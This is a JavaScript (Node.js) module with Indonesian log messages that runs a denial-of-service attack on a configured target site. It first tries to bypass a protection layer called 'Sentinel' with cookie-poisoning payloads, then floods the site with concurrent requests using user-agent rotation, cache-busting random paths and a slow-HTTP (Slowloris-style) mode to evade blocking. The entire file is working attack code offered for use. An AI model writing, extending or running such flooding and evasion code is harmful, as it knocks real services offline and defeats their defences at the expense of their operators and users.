const { default: pLimit } = require('p-limit');
const { sendRequest } = require('../utils/request');
const { DDOS_CONFIG, TARGET_URL, EXPLOIT_PAYLOADS } = require('../utils/config');
const { printDdosProgress } = require('../utils/ui');

const limit = pLimit(DDOS_CONFIG.CONCURRENT);

async function runDdos(stats, startTime, customCount = 0) {
    const totalRequests = customCount || DDOS_CONFIG.TOTAL_REQUESTS;
    console.log(`\n🔥 MEMULAI SERANGAN DDOS LANJUTAN KE ${TARGET_URL}`);
    console.log(`Metode: ${DDOS_CONFIG.METHOD} | Concurrency: ${DDOS_CONFIG.CONCURRENT} | Requests: ${totalRequests}`);
    console.log(`Evasion: ${DDOS_CONFIG.EVASION_MODE ? 'ON' : 'OFF'}`);
    console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');

    const tasks = [];
    const executeRequest = async (exploitType = null) => {
        let options = {};
        if (DDOS_CONFIG.EVASION_MODE) {
            options.forceRotateUA = true;
        }
        
        if (exploitType === 'CONFIG_POISON') {
            options.exploitCookie = EXPLOIT_PAYLOADS.SENTINEL_DISABLE.cookie;
        } else if (exploitType === 'SPOOF_VERIFY') {
            options.exploitCookie = EXPLOIT_PAYLOADS.SENTINEL_BYPASS.cookie;
        }

        const paths = ['', '/', '/login', '/register', '/faq', '/terms', '/privasi'];
        const randomPath = paths[Math.floor(Math.random() * paths.length)];
        const cacheBuster = `?v=${Math.random().toString(36).substring(7)}&t=${Date.now()}`;
        
        let res;
        if (exploitType === 'SLOW_LORIS') {
            // Simulasikan Slow HTTP dengan timeout tinggi dan data minim
            res = await sendRequest(randomPath + cacheBuster, 'GET', null, { 'X-Slow': 'Keep-Alive' }, { ...options, timeout: 30000 });
        } else {
            res = await sendRequest(randomPath + cacheBuster, DDOS_CONFIG.METHOD, null, {}, options);
        }
        
        if (res.status === 'SUCCESS') {
            stats.success++;
            stats.totalLatency += res.latency;
        } else if (res.status === 'BLOCKED') {
            stats.blocked++;
        } else {
            stats.failed++;
        }
        printDdosProgress(stats, startTime);
    };

    // Phase 1: Warming up with Exploit Payloads to poison the cache/bypass
    console.log('🧪 PHASE 1: Mencoba Bypass Sentinel via Cookie Poisoning...');
    for (let i = 0; i < 10; i++) {
        await executeRequest('CONFIG_POISON');
        await executeRequest('SPOOF_VERIFY');
    }

    // Phase 2: Mass Attack
    if (DDOS_CONFIG.DURATION_SEC > 0) {
        const deadline = startTime + DDOS_CONFIG.DURATION_SEC * 1000;
        while (Date.now() < deadline) {
            for (let i = 0; i < DDOS_CONFIG.CONCURRENT && Date.now() < deadline; i++) {
                tasks.push(limit(() => executeRequest()));
            }
            await Promise.all(tasks.splice(0, DDOS_CONFIG.CONCURRENT));
        }
        await Promise.all(tasks);
    } else {
        for (let i = 0; i < totalRequests; i++) {
            tasks.push(limit(() => executeRequest()));
        }
        await Promise.all(tasks);
    }
}

module.exports = runDdos;
